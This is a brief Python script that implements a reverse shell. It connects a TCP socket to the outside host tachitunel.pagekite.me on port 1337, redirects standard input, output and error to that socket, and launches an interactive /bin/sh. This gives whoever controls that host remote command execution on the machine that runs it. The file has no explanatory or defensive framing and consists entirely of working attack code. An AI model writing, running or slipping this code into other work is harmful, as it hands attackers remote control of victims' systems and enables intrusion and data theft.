import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("tachitunel.pagekite.me", 1337)) 
os.dup2(s.fileno(), 0)  
os.dup2(s.fileno(), 1)  
os.dup2(s.fileno(), 2)  
subprocess.call(["/bin/sh", "-i"])  
